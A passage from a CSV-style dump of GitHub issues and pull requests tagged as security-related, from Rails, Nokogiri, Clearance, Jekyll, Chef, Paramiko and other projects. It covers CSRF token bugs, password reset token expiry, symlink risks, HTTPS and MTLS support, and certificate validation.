Pinging @rafaelfranca and @amatsuda because both of you had merges in that code region. Please tell me, if there is a chance to have this merged/fixed.

",yes,"actionpack,security,"
rails/rails,627474385,"Remove HTML fallback for JS requests","We shouldn't fall back to HTML for JS requests because caching proxies
might cache secrets that are embedded in the HTML (like CSRF tokens).

See #39475

I *think* this removes everything related to the HTML fallback, but I'm not 100% sure.","If you render a html partial in a js.erb file, will that still work? If not, this would be a breaking regression.Just came across a similar older PR https://github.com/rails/rails/pull/28251> If you render a html partial in a js.erb file, will that still work? If not, this would be a breaking regression.

I *think* the bit of code that I left (the part that @eugeneius commented on) is the thing that enables rending an HTML partial inside a `js.erb` file.  I'm pretty sure we have tests for it, but I want to verify with an app.I tried removing that code and no tests failed in the Action View or Action Pack suites. I wrote a regression test for it in https://github.com/rails/rails/pull/39480.@eugeneius thank you! I merged the PR and rebased this one. Lets see what the tests do.ðŸ‘‹ @eugeneius, I would be happy to discuss this issue with you to get your point of view before we add it to our vulnDB. can you reach out at gurshafriri@snyk.io? 
Hey @gurshafriri ðŸ‘‹ there's a writeup of the problem being fixed here in https://github.com/rails/rails/issues/39475, feel free to ask questions there if anything's unclear.

Also just FYI, I'm not on the Rails security team; I'm reviewing this PR in my capacity as a ""regular"" maintainer, if that makes sense ðŸ™‚ This pull request has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs.
Thank you for your contributions.
Anything pending here? ðŸ‘€ ",yes,"actionpack,actionview,security,"
rails/rails,228621595,"weird behavior of per_form_csrf_tokens","### Steps to reproduce
I am created a demo app for testing [here](https://github.com/apinrdw/test-csrf-token), and also override the `RequestForgeryProtection#valid_authenticity_token?` for logging.
- open http://localhost:3000/posts/new
- fill and submit the form  
- and see the console.

### Expected behavior
```
per_form_csrf_tokens: true
compare_with_real_token: false
valid_per_form_csrf_token?: true
```

### Actual behavior
```
per_form_csrf_tokens: true
compare_with_real_token: true
valid_per_form_csrf_token?: false
```

### System configuration
**Rails version**:
5.0.3
**Ruby version**:
2.4.1","Doesn't repro here. After cloning your project and running, I get the expected

per_form_csrf_tokens: true
compare_with_real_token: false
valid_per_form_csrf_token?: trueI have the same problem in test app delivered by @apinrdw and in my own 5.0.3 and 5.1.0 apps. The worst part is, per-form check simply doesn't work - I can paste `authenticity_token` from one form to another and it will be successfully submitted.

Giving these [two lines](https://github.com/rails/rails/blob/a500b4796f86b05b3fece414f090a496d3cb4298/actionpack/lib/action_controller/metal/request_forgery_protection.rb#L340-L341) it's not surprising, I guess. The first part of the alternative is obviously true, so it doesn't even check the second, form-specific part.

Steps to reproduce:
- Open form A (let's say `Posts#create` form) in the 1st tab.
- Open form B (let's say `Users#update` form) in the 2nd tab.
- Paste `authenticity_token` from B to A.
- Submit A.
- Watch A being successfully submitted instead of rejected.I created [PR](https://github.com/rails/rails/pull/29368) for that.@apinrdw it's been a while since you reported this bug, would you be able to refresh your demo app / update your PR to Rails master and try to reproduce the bug again?",no,"security,"
sparklemotion/nokogiri,352338059,"Add support for configuration of XSLT security",,"@maths22 Thank you for submitting this! And apologies for my slow reply. Will look at it and optimistically would like to ship in v1.11.0 (see milestone).I just rebased this off current `main` and added an assertion about `NotImplementedError` to the tests for JRuby.
Again, apologies for the long delay in reviewing this and providing feedback.

There are a few things about this PR that I'd like to change:

- naming. Currently Nokogiri uses the word ""options"" (e.g., ParseOptions, SaveOptions) and this PR introduces two new words for the same concept: ""prefs"" and ""config"". I see that the [libxslt docs](http://xmlsoft.org/xslt/html/libxslt-security.html) use ""prefs"" but in the past the places where we've closely mirrored the libxml2 API are generally the parts of the API I regret most. I think we can improve on libxslt's API.
- initial values. It's not clear from this code or the tests what the initial values of these options is, and the setter isn't called by default.
- tests. I'd really like to have some tests exercising each of these libxslt features so we know whether we accidentally break them in a future release. this again is a hard-won lesson from not doing so when implementing ParseOptions or SaveOptions.

If you're not interested in working on this PR, given the long time delay, I understand. But please let me know if you think you'll be able to work on it? Otherwise I'll keep it open and hopefully find time to address some of this feedback.
",yes,"topic/security,state/pr-under-review,"
kennethkalmer/powerdns-on-rails,1194519,"Restrict creating RR's","If user 1 owns 'example.com', user 2 shouldn't be able to create 'test.example.com'. (It makes it trivial for unrelated users to ""take over"" a domain).

_http://kennethkalmer.lighthouseapp.com/projects/11831/tickets/90-restrict-creating-sub-domains_
",,no,"lighthouse,security,"
thoughtbot/clearance,43544095,"Expire password reset token after a period of time","Generating a password reset token without any expiration time opens up a potential security flaw. Not a very easily exploitable one, but an easily preventable one nonetheless. More info: http://www.owasp.org/index.php/Forgot_Password_Cheat_Sheet#Step_3.29_Send_a_Token_Over_a_Side-Channel
In addition to their email account being compromised, there's another possible scenario: if a user clicks Reset Password but never gets around to actually resetting their password, anyone who gets access to the backend database at any point in the future can reset that user's password. This would be much faster than trying to crack the encrypted password. And since by default there is no email sent upon password change, the user might not ever know that their account has been compromised.
","> Generating a password reset token without any expiration time opens up a potential security flaw. Not a very easily exploitable one, but an easily preventable one nonetheless.

I agree. Password resets should expire for the reasons you list. This has been on my radar, but I'll have to think about how best to address this. It's likely a breaking change that will need to go to 2.0.
Is this still an issue?",no,"security,"
thoughtbot/clearance,754373223,"possible timing attack on password reset flow","After creating a PR to prevent a potential timing attacks with the remember token #917, I realized that at least one similar attack vector exists with clearance.

For example [here's how devise sets the confirmation token](https://github.com/heartcombo/devise/blob/eed641d2bea11839ab13e943660da41cad14314d/lib/devise/models/recoverable.rb#L89), and [finds the user](https://github.com/heartcombo/devise/blob/eed641d2bea11839ab13e943660da41cad14314d/lib/devise/models/recoverable.rb#L126). The confirmation token is not directly queried in the database, but rather its digest is. This makes it safe against timing attack.

In contrast, [clearance queries the database from a user-supplied token](https://github.com/thoughtbot/clearance/blob/fbaf5cf368bc6512c11251559c5ecb655276994f/app/controllers/clearance/passwords_controller.rb#L59). It also exposes the user_id, which seems unnecessary / leaks some info.

If I'm not mistaken, Clearance doesn't offer a confirmation flow out of the box, but users who might want to implement it, might build it based on the examples in Clearance. So there's a secondary effect here as well to take into account. (Devise seems to handle it similarly to password reset as far as I can tell).

","Like @dorianmariefr said elsewhere, if you put an index on that column then that changes the timing of the lookup.

I guess this could be a timing attack otherwise but fixing it seems academic. How would you get the DB lookup to be so slow but the rest of the entirety of your Rails stack to be so consistent that you'd be able to notice?",no,"security,"
Shopify/shopify_app,1071277136,"Validating Admin Links","Someone has to understand this. How to deal with it correctly? 

An admin link is built by Shopify and sent to an App and looks like this:

    /admin_links/product?hmac=7cc99f2a98197cfe027e140cd142be54421509148de36578d8fcaddbdfad269a&id=4698512294027&locale=en&session=8767bfa0d1dd0d113211ce380dc8d144f76727112f57502977f7102a3bbfd161&shop=highfalls2020.myshopify.com&timestamp=1638645066""

So we have an HMAC, id, locale, session, shop and timestamp. 

How to use that to verify this is a good secure request? Also, there is no host. 

So what I tried, was to sort the params, and HMAC compare. Fail. And that was it. Out of ideas. What does the Shopify braintrust have to say? Anything? I see no trace whatsoever anywhere of validating Admin Links. Recipe please? 
",,no,"security,bug,support,"
jekyll/jekyll,695163109,"Preserve symlink targets in the local system","<!--
  Thanks for creating a Pull Request! Before you submit, please make sure
  you've done the following:

  - I read the contributing document at https://jekyllrb.com/docs/contributing/
-->

<!--
  Make our lives easier! Choose one of the following by uncommenting it:
-->
This is a ðŸ› bug fix.
<!--  -->
<!-- This is a ðŸ™‹ feature or enhancement. -->
<!-- This is a ðŸ”¦ documentation change. -->
<!-- This is a ðŸ”¨ code refactoring. -->

<!--
  Before you submit this pull request, make sure to have a look at the following
  checklist. If you don't know how to do some of these, that's fine! Submit
  your pull request and we will help you out on the way.

  - I've added tests (if it's a bug, feature or enhancement)
  - I've adjusted the documentation (if it's a feature or enhancement)
  - The test suite passes locally (run `script/cibuild` to verify this)
-->

## Summary

Instead of copying symlinks verbatim to `_site`, this rewrites them to the absolute path so that they keep pointing at the right file.

## Context

<!--
  Is this related to any GitHub issue(s)?

  You can use keywords to automatically close the related issue.
  For example, (all of) the following will close issue #4567 when your PR is merged.

  Closes #4567
  Fixes #4567
  Resolves #4567

  Use any one of the above as applicable.
-->

This is a rebase of #8299 with all comments from that PR addressed and tests added.

Fixes #6870, closes #8299
","Rebased to current HEAD. Anything else I can do to help here?> Anything else I can do to help here?

:) Thank you for resolving merge conflicts. What this needs is some documentation (and a nice title for this PR.. :wink:)

Also, waiting for a review from @parkr or @mattr- since symlinks are security concerns..At a minimum, this needs a check to ensure that the resolved symlink is inside the site's source directory. Dereferencing symlinks that point to outside the site source is a large security risk that this PR doesn't address yet.Oh yeah - I think I can see how that would be awful. Not quite sure how to address though.

My use-case is where I deploy approximately 50GB of files outside of git and want to reference those instead of copying around.> My use-case is where I deploy approximately 50GB of files outside of git and want to reference those instead of copying around.

Maybe you can use [hardlinks](https://rubygems.org/gems/jekyll-hardlinks) instead? :) > Maybe you can use [hardlinks](https://rubygems.org/gems/jekyll-hardlinks) instead? :)

This is dependent on another tool ([git-annex](https://git-annex.branchable.com/)), which reduces my flexibility a lot.>> Maybe you can use [hardlinks](https://rubygems.org/gems/jekyll-hardlinks) instead? :)
>
> This is dependent on another tool ([git-annex](https://git-annex.branchable.com/)), which reduces my flexibility a lot.

it just changes `Jekyll::StaticFile#write` to use `FileUtils.ln` ðŸ¤”
Given the issues raised with this draft, I've decided to just eat the additional storage requirements instead of trying to improve on this code here.",yes,"fix,security,needs-documentation,"
wraith/wraith,3456745,"Botnet SSL support",,,no,"security,"
wraith/wraith,3285778,"* Rewritten mIRC AuthSystem script (fixes a serious bug)",,"There's a lot of valid compatibility code that's been removed.

I say just fix the core issue and add the `if... return` line into the `ON TEXT` events.
the compatibility code was for mirc <=5.8 IIRC, which is from somewhere in 2000.
i have no intentions to waste time on (re)writing such code.
the current piece works perfectly for any mirc i tested >=6.35, and should work just fine for >5.8 (maybe 5.8 too, didnt test).

also, in any case, it works with 6.35 and higher, which is the last 4 years or so.
IMO theres no reason to make the script large and nasty because of compatibility for SUCH an old version of mirc..
Well for example, you removed the telnet/dcc support. I cannot take it as it is. While you may think 5.8 is too old to care about, the fact is there's users still using older mIRC, and there's no reason to stop supporting them, especially in a commit/branch to fix a security issue that's unrelated.
I'll rewrite the DCC support. The telnet support should still be there IIRC.
About the mIRC compatibility, 5.8 is from year 2000... how long will you want to keep on supporting it?
Maybe you'll want to insert this script as an addition, like the old one for older mIRC and this one for the newer?
",yes,"defect,security,"
showdownjs/showdown,683718342,"Appears to be incompatible with strict-dynamic content security policy","I was doing some testing today and I noticed that the pages utilizing showdown.js were not working (the dynamic Markdown rendering). I investigated and tweaked some things with my Content Security Policy header, which is presently whitelist based. I tried adding strict-dynamic to it and then added a nonce to the script call (showdown.min.js) to see if that would fix it. It did not. The only way I could get it to work was by leaving unsafe-inline in my CSP but removing strict-dynamic and the nonce so that unsafe-inline could take full effect. The whole idea of strict-dynamic and nonces are that a properly written arbitrary script should be able to work, but either with or without strict-dynamic, this library does not work. Effectively, this project is going to break over time further if not rewritten - hoping this can be addressed! Is there a reason this can't be compatible with CSP3? Wondering if I should wait for it to become compatible or just apply a different CSP for pages utilizing showdownjs which uses unsafe-inline only on those pages.","Forgive my ignorance, is this because of ShowdownsXSS issue? https://github.com/showdownjs/showdown#xss-vulnerabilityNot 100% sure... CSPs dictate what code should be allowed to execute on a page, and if I recall correctly Showdown required extremely liberal rules to be set up to allow Showdown to work, which are considered a bad security practice today. CSPs help prevent XSS, though, so that may be related: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",no,"security,"
rnhurt/gradesheet,84933,"Strip carriage return & line feed characters from supporting skills","Currently, carriage returns and line feeds (/r/n) are getting saved to the database.  It's not causing any problems (that I know of) but it is unclean and just feels dirty.  Better yet, we should be scrubbing this field to remove _all_ weird things.
",,no,"Bug,Security,"
bellroy/lesswrong,101790070,"HTTPS Support","_From [AngryPar...@gmail.com](https://code.google.com/u/104249632091829167509/) on November 09, 2010 13:35:08_

Although FireSheep doesn't steal sessions from LW/reddit accounts by default, it's really easy to add that capability. To mitigate this, LessWrong should be accessible over https. I searched issues for ssl and https but didn't find anything, so I'm creating this issue.

Attachments:
Screenshot of me stealing my own session. 
JavaScript for FireSheep

My main concern would be someone stealing an admin's session at a meetup. Also, I promise not to steal anyone's session besides my own.

**Attachment:** [LessWrong.js Screen shot 2010-11-08 at 6.00.18 PM.png](http://code.google.com/p/lesswrong/issues/detail?id=232)

_Original issue: http://code.google.com/p/lesswrong/issues/detail?id=232_
","_From [Matthew.Fallshaw](https://code.google.com/u/Matthew.Fallshaw/) on April 21, 2011 22:10:21_

**Status:** Started  
  **Labels:** -Priority-Medium -Milestone-Future Priority-High Milestone-Now  
_From [wjmo...@gmail.com](https://code.google.com/u/117567618910921056910/) on July 24, 2011 22:47:18_

Making Less Wrong use SSL is a good idea, the following should be taken into consideration:
- In order to realise the security benefits of running over SSL the session cookie must be marked secureOnly so that it isn't submitted to insecure resources linked on secure pages (E.g. user generated LW links). There are code changes required to support this.
- Using a secure cookie implies that all insecure resources will be redirected to their secure variant. This is either a global change (the site is only on HTTPS) or there is code support required to know when to perform these redirects.
- Switching to HTTPS only is probably the easier way to go however HTTPS is generally slower due to additional negotiations required between the client and server.
- LW is hosted through a load balancer to one or more app servers therefore HTTPS must terminate at the load balancer. Typically in these situations the load balancer will set a header indicating the original protocol in case the app server needs to generate an absolute URL (E.g. in feeds). Code to support this header might be required.
_From [RedWordS...@gmail.com](https://code.google.com/u/111691611170124976348/) on July 28, 2011 14:45:56_

**Labels:** Security  
_From [Matthew.Fallshaw](https://code.google.com/u/Matthew.Fallshaw/) on June 11, 2012 15:07:54_

This got hard. If anyone cares a lot, poke me, and I might push it up in priority.

**Labels:** -Priority-High -Milestone-Now Priority-Medium Milestone-Future  
_From [Matthew.Fallshaw](https://code.google.com/u/Matthew.Fallshaw/) on August 02, 2012 23:05:27_

**Cc:** Matthew.Fallshaw  
_From [Matthew.Fallshaw](https://code.google.com/u/Matthew.Fallshaw/) on August 14, 2012 20:28:15_

**Status:** Accepted  
What happened to this? Did it get stuck because of the problem with certificates? Because maybe Let's Encrypt has made it easier now.
I don't believe this was a certificates issue, rather an implementation issue.
This still poses challenges as mentioned by @wezm in this [previous comment](https://github.com/tricycle/lesswrong/issues/330#issuecomment-132416463).
It would also increase server load and slow the response time of the site.
I really donâ€™t like that the site forces one to login using `http://` action URIs. Thereâ€™s no protection for users who want to access the site over unprotected networks.

@cdaloisio has that increased load been proven? Keepalive should mitigate the response time for subsequent requests. Most modern and many heavily used websites like Google and reddit use HTTPS without noticeably increasing initial response time.Thanks for the follow-up @binki. It has been a significant amount of time since I commented on this issue, and since then, LessWrong is going to be migrating to www.lesserwrong.com sometime in the future. Please see this post for more details. http://lesswrong.com/lw/pfl/lw_20_open_beta_live/

This codebase is not actively being developed with the intention of retiring it.",no,"imported,Priority-Medium,Type-Feature,Security,"
chef/chef,988133595,"Develop a resource that converts an existing client.pem setup to one capable of MTLS","```
As a Chef administrator
I would like a way to programmatically setup nodes to use MTLS
so that I can migrate existing systems to MTLS using Chef
```

Currently, we have the ability to enable cert validation on the Infra Server and we have the ability to use the cert chain on the client, but we don't have a way to get existing clients setup for MTLS communication. We need to provide users with the tools in chef recipes to setup the x509 cert/pem files given their existing client.pem and a CA cert.

## Potential Look / Feel

This should be considered a high level idea. Change what you need.

```ruby
chef_client_mtls_cert_migration 'setup node mtls certs' do
  ca_cert 'ABC123_I_AM_CERT_STRING'
end
```

## Requirements

- Resource is marked sensitive to prevent logs from containing the cert contents
- takes ca cert either as string or as path on disk
- has a property for specifying the client.pem location which defaults to the right location based on OS as determined by chef-config
- Outputs cert and key to the default location
","this seems fine.  the resource name is a mouthful, but i see the general sense of it.  `chef_client_mtls_conversion` is the only thing i can come up with as an alternative that maintains it in the `chef_client_*` ""namespace"" of resource prefixes.The name should be part of that ""change what you need"" comment. If someone has some magical name I'm for it.",no,"Aspect: Security,Triage: Feature Request,Focus: MTLS,"
chef/chef,811654760,"Create a helper for fetching values from AWS Parameter Store","While not often thought of as a ""secrets manager"" the AWS SSM Parameter Store is a pretty capable general-purpose key/value store that also has IAM based access control. This makes it a great secrets manager for many and also a nice place to store configuration options if they need them accessible by other AWS services or don't want to put them directly into their Chef Infra Server.

The AWS cookbook has a resource to get/set these parameters, which is functional, but rather odd since it's a resource that fetches into the node state. We really just want a helper for fetching (not setting) that behaves similarly to the resource, but fetch directly w/o messing with the node.

Here's the current resource:
https://github.com/sous-chefs/aws#aws_ssm_parameter_store

More information on SSM Parameter Store:
https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html

Looking at the current API it seems like we can probably consolidate things a bit. We currently have a `get`, `get_parameters`, and `get_parameters_by_path` action on the resource. We may be able to get away with either specifying a direct path to the parameter in which case we return a string, or a  path above that where we'd return a hash of all the keys and values.

Also we should just also perform the function of the `with_decryption` property.

## Definition of Done

- Helper method for accessing ssm_parameter_store roughly matching the capabilities of the existing chef resource
- Documentation on docs.chef.io
- Helpers included in the chef vscode plugin via the method -> YARD -> vscode automation","So if not pulling down into node state, will there not be any form of caching? I'd be concerned at least with `get_parameters_by_path` depending on how many parameters there are if you are fetching on every access. ",no,"Aspect: Security,"
chef/chef,919032664,"Identify and remediate unfiltered node attributes sent to external systems","In doing the work for #10895 , I took a quick look through and found other situations that we allow unfiltered node attributes to exit the system.   

One such example is `handlers/json_file.rb` which uses  RunStatus.to_h`.  `RunStatus` includes the node object which will not filter when `to_h` is invoked.

Let's spend some cycles  going through the code base and finding  other places that don't respect attribute block/allowlist rules. ",,no,"Aspect: Security,Status: Untriaged,"
chef/chef,992460512,"Akeyless iam auth support","Now that we have the akeyless secrets helper support in place we need to extend this to allow using AWS iam auth in the helper. This can be done in akeyless but requires API calls to their main service to get a token. We need to investigate the difficulty of doing this.",,no,"Aspect: Security,Triage: Feature Request,Epic,Focus: Secrets,"
chef/chef,988145656,"knife bootstrap needs to setup nodes for MTLS","As we rollout MTLS we need to ensure that new nodes can be bootstrapped to use MTLS. This means knife bootstrap for both *nix and windows systems needs to be able to generate a client.rb file with `ssl_client_cert`/`ssl_client_key` set and with the necessary key and cert on disk.",,no,"Aspect: Security,Triage: Feature Request,Focus: MTLS,"
chef/chef,801473019,"Chef Infra needs a way to provide secure credentials in the client.rb","### Describe the Enhancement:
<!---  What you are trying to achieve that you can't? -->
When specifying the `rubygems_url`, `http_proxy`, or `https_proxy` values in Chef Infra client's client.rb file, it seems that the only way to provide authentication credentials (e.g., to a private rubygems repo), is to embed the username and password in the URL, like `https://myuser:mypass@private.rubygems.repo`. This is not ideal, as the file could be read by anyone without changing the mode to `640` or stricter. For example, the `chef-client::config` recipe sets the permissions on the client.rb wide open: https://github.com/chef-cookbooks/chef-client/blob/master/recipes/config.rb#L83

### Describe the Need:
<!---  What kind of user do you believe would utilize this enhancement, and how many users might want this functionality -->
Storing credentials in the client.rb file is not secure.

### Current Alternative
<!--- Is there a current alternative that you can utilize to workaround the lack of this enhancement -->
The best we can do today is setting the file mode to 640 or stricter, but it would be optimal to have a better way to provide the credentials to the Chef client.

### Can We Help You Implement This?:
<!---  The best way to ensure your enhancement is built is to help implement the enhancement yourself. If you're interested in helping out we'd love to give you a hand to make this possible. Let us know if there's something you need. -->
",,no,"Aspect: Security,Triage: Feature Request,"
chef/chef,129216144,"Chef Client has no support for Self Signed SAN Certificates. ","**Versions**
- Chef Standalone Server:  12.3.1 (Deb Package)
- Chef Development Kit: 0.10.0
- Chef Client: 12.5.1

**Environment**
- Chef Server: Ubuntu 14.04.1 LTS 
- Workstation: Mac OSX v10.11.2 (Ruby 2.2.1 & OpenSSL 0.9.8zg 14 July 2015)

**Issue**
We have a Chef Server which has both public and private DNS names. such as chef.example.com (Public) & chef.example.cloud (Private). So with the certificates common name set to ""chef.example.cloud"" chef-clients on our private network work perfectly. 

On our public side it is a different story onced I have fetched the certs using:

``` bash
knife ssl fetch https://chef.example.com
```

Which give me the following expected output.

``` bash
WARNING: Certificates from chef.example.com will be fetched and placed in your trusted_cert
directory (/Users/<USERNAME>/.chef/trusted_certs).

Knife has no means to verify these are the correct certificates. You should
verify the authenticity of these certificates after downloading.

Adding certificate for chef.example.cloud in /Users/<USERNAME>/.chef/trusted_certs/chef_example_cloud.crt
```

That works file. Then when i check the certificates using this command: 

``` bash
knife ssl check https://chef.example.com 
```

I get the following error which is not what I am expecting.

``` bash
Connecting to host chef.example.com:443
ERROR: The SSL cert is signed by a trusted authority but is not valid for the given hostname
ERROR: You are attempting to connect to:   'chef.example.com'
ERROR: The server's certificate belongs to 'chef.example.cloud'

TO FIX THIS ERROR:

The solution for this issue depends on your networking configuration. If you
are able to connect to this server using the hostname chef.example.cloud
instead of chef.example.com, then you can resolve this issue by updating chef_server_url
in your configuration file.

If you are not able to connect to the server using the hostname chef.example.cloud
you will have to update the certificate on the server to use the correct hostname.
```

So next I verify the connection using OpenSSL s_client directly to check it not the certificate.

``` bash
openssl s_client -port 443 -host chef.example.com -CAfile /Users/<USERNAME>/.chef/trusted_certs/chef_example_cloud.crt
```

I get a similar output to what is shown below.

``` bash
CONNECTED(00000003)
depth=0 /C=US/ST=NewYork/L=NewYork/O=ExampleCompany/OU=DevOps Team/CN=chef.example.cloud/emailAddress=devops@example.com/subjectAltName=DNS.1=chef.example.com
verify return:1

---
Certificate chain
 0 s:/C=US/ST=NewYork/L=NewYork/O=ExampleCompany/OU=DevOps Team/CN=chef.example.cloud/emailAddress=devops@example.com/subjectAltName=DNS.1=chef.example.com
   i:/C=US/ST=NewYork/L=NewYork/O=ExampleCompany/OU=DevOps Team/CN=chef.example.cloud/emailAddress=devops@example.com/subjectAltName=DNS.1=chef.example.com

---
Server certificate
-----BEGIN CERTIFICATE-----
MIIEgzCCA2ugAwI .......... 1uxiodZKZQ==
-----END CERTIFICATE-----
subject=/C=US/ST=NewYork/L=NewYork/O=ExampleCompany/OU=DevOps Team/CN=chef.example.cloud/emailAddress=devops@example.com/subjectAltName=DNS.1=chef.example.com
issuer=/C=US/ST=NewYork/L=NewYork/O=ExampleCompany/OU=DevOps Team/CN=chef.example.cloud/emailAddress=devops@example.com/subjectAltName=DNS.1=chef.example.com

---
No client certificate CA names sent

---
SSL handshake has read 2114 bytes and written 456 bytes

---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES128-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : TLSv1
    Cipher    : DHE-RSA-AES128-SHA
    Session-ID: 20CA00067CF071B185E30BD3CC9F42202893B2645F4BF59F12F94BB1FE3765D1
    Session-ID-ctx: 
    Master-Key: 5E3D97B1341004C4A9CE8A6A12673E608681D9F24B6D9892C84834985A2D35889AB87F37861636B2D52D01962457CD42
    Key-Arg   : None
    Start Time: 1453915540
    Timeout   : 300 (sec)
    Verify return code: 0 (ok)

---
```

To conclude OpenSSL is verifying my Certificate correctly but Chef only uses the common name to do SSL verification which is the issue. As I can't find a way other than SAN Certificates to have Chef Server have multiple single certificate on the same standalone server. 

Any help would be most appreciated to enable this functionality.
","Agreed, this looks like something we should fix.
Thanks thommay :)
I'm assigning this to the sustaining team to see if they can replicate this on a modern chef-client binary since the openssl ruby bindings have been significantly updated in the last few years.",no,"Type: Bug,Priority: Low,Aspect: Security,Status: Needs Replication,"
chef/chef,686496113,"Anything that uses `remote_file` under the hood should expose `ssl_verify_mode`","### Describe the Enhancement:

We recently added `ssl_verify_mode` to `remote_file`. But there's no way to pass that through things like `windows_package`. We should expose that.

### Describe the Need:

Same as the other need - being able to handle internal servers with self-signed certs.

","Tagging this for the sustaining backlog. Turns out there *is* a way to do this already, at least for windows_package - there's a `remote_file_attributes` property which works great! That completely solves my problem, but looking through the code base I see a few that don't have this feature: `cab_package`, and `zypper_repository`. 

`packages/deb.rb` uses `remote_file`, but there's no deb_package, and I don't see that `dpkg_package` allows URLs, so I'm not quite clear where the entry point for that one is.",no,"Aspect: Security,Triage: Feature Request,Focus: Resources,"
chef/chef,747076512,"Allow client key to be retrieved from the windows certificate store","## Background

This is the first portion of our larger effort to remove client.pem files from disk where possible.

In this initial implementation, we will add the ability to fetch client.pem content from the Windows Certificate Store as the default behavior with configuration values to specify specifics.

----

## Acceptance Criteria

- When running the `chef-client` CLI the client.pem will be fetched in the following order
  - MY store at the Local System level
  - Local disk at the existing location
- The key will be identified in the store using the Chef Infra Client and the node name, allowing us to have multiple nodes managed by a single node in the future
- Documentation
","https://github.com/chef/chef/pull/12426",no,"Aspect: Security,Platform: Windows,Triage: Feature Request,Epic,"
chef/chef,988146355,"chef_client_config needs to include support for ssl_client_cert and ssl_client_key","To support MTLS we need to elevate the `ssl_client_cert` and `ssl_client_key` and properties. This could be as simple as adding these with nil defaults or if we want to enable some magic we can make these properties automatically add to the client config if the files exist on disk. I'm open to debate on either of those approaches, but either way we need to make sure MTLS config on the client side is simple.",,no,"Aspect: Security,Triage: Feature Request,Focus: MTLS,"
chef/chef,980610689,"Store Infra Client client.pem contents in the macOS Keychain","I just realized we didn't actually have an issue for this even though it's on our roadmap for H2 2021.

Once we're done with moving client.pem contents into the Windows Certificate Store as the default we need to do the same on macOS hosts with the keychain. This requires logic in the client to read a predefined keychain location by default and to set this up during bootstrap with validation.pem files or via knife.","@tas50 Is this still something that is planned?I'm no longer with Chef so I don't know where this sits in the product roadmapDustin, this has been archived for now. We still think this is important but want to finish some work against the Windows Certificate store. After that we will reevaluate and reprioritize. ",no,"Aspect: Security,Triage: Feature Request,Epic,Focus: Desktop,"
paramiko/paramiko,176189614,"Support the 'null' hostkey algorithm for 'proper' GSSAPI support","## Description

It looks like our existing GSSAPI support isn't entirely RFC-compatible which causes problems for some users. From an email:

> Paramiko says it supports GSSAPI key exchange. If
> I read the RFC https://www.ietf.org/rfc/rfc4462.txt correctly, in
> section 5 it says:
> 
> > Any implementation supporting at least one key exchange method that
> > conforms to Section 2 MUST also support the ""null"" host key
> > algorithm.
> 
> My tests show that paramiko does not support this. As our servers use
> only GSSAPI and thus only advertise the null host key method, paramiko
> does not work against our servers. As the RFC states ""MUST"", this is
> a bug and not a feature request.
> 
> I have looked at the code and saw the following in transport.py around line 121:
> 
> ```
> _preferred_keys = (
>    'ssh-rsa',
>   'ssh-dss',
> ) + tuple(ECDSAKey.supported_key_format_identifiers())
> ```
> 
> If I change this to
> 
> ```
> _preferred_keys = (
>     'ssh-rsa',
>     'ssh-dss',
> ) + tuple(ECDSAKey.supported_key_format_identifiers()) + ( 'null', )
> ```
> 
> then I may have added the right thing and I can use paramiko against
> our servers. I do however not know if this has any other side effects
> (like making this unsecure for other auth methods ;)
## TODO
- [ ] Verify exactly what `null` hostkey algorithm is and what its implications are re: whether we want it included in the default `_preferred_keys` list, or if that will open users up to vulnerabilities somehow
- [ ] Either add it to that default, if it seems safe; or if not, attach this to #387 since it becomes another ""allow flexibility in accepted key types / algorithms / ciphers"" feature need.
","Marking as a bug; if it turns into a sub-case of #387 I'll just close and add to a list of ""stuff that needs to be possible to implement this"" over there.
",no,"Needs investigation,Bug,Security,"
paramiko/paramiko,1235544179,"Make Transport cipher/algorithm choice lists fully user-configurable","This is an age old problem: users need ability to shuffle the order of, or flat out remove, certain options for kex, hostkey checks, pubkey auth offering, and so forth. This isn't currently possible without editing your Paramiko or doing monkeypatching on your Transport class or instance. A weak bone was thrown to this with `disabled_algorithms` recently but it's just a mediocre band-aid by all accounts.

Transport needs updating so that these lists are easy to override/modify/etc:

* Minimum: straight up overwriting w/o monkeypatching, which allows most of the below, if not super user friendly (outside of the cases where one truly wants a very small list of supported algos)
* Nicer: easy/ier API for removing problematic algorithms, eg ""drop Blowfish so Cryptography shuts up (n.b. this is actually going to be moot soon but a good example of the issue)"" or ""drop SHA1-based stuff to force use of SHA2"". `disabled_algorithms` allows this but is a bit clunky due to use of dicts. Maybe we want stuff like `Transport.remove_algorithms()` or w/e.
* Maybe: allow shuffling-without-removal, eg shift undesirable algorithms lower down the list. I don't see when one would want this over straight removal or overwriting though.
* Probably smart: remove `SecurityOptions` which is an old and crummy attempt at this same problem class. It's actually made things worse by being copypasta that then rots differently from the rest of the code! If we're putting this out as a backwards incompat fashion then such a deletion would go well. Otherwise, deprecate.
* Extra credit: build in some easy way to bridge SSHConfig settings for these, though that's a higher level problem yet unsolved. Probably best to start with one of the other bullet points + Fabric consuming the new API instead, since that already works.

Related:

* #387 insofar as that's another moderate sized auth/connection related shakeup badly overdue
* #1527 and #1652 are reverse-duplicates of this (I thought we had a ticket for this ages ago but ... can't find it?)","Believe this also covers #2049?> Believe this also covers #2049?

Sounds to me like it does.I've came here after reading #1961, and instead of creating new issues i'm adding comment here.

>  If anyone can identify legit issues with the new feature that are not fixable by using disabled_algorithms (or pinning to 2.8.x until one's servers are upgraded - absolutely an acceptable solution!)

We having many junos devices in our network, some of them new, some of them old. Not all can be upgraded. And we're using [py-junos-eznc](https://github.com/Juniper/py-junos-eznc) with ssh transport to comminicate with those devices. It uses netconf which uses paramiko.

After updating to latest `paramiko` we can't connect to some junos devices. For now we're pinned paramiko to 2.8, but please, consider using some fallback algorithm to allow seamlessly connecting to old hardware.

```
paramiko.transport.transport._log: Server did not send a server-sig-algs list; defaulting to our first preferred algo ('rsa-sha2-512')
````

I think paramiko should not default to using first algorithm and fail, but try some other until it works.Until this issue is resolved, I have a question related to #2049 
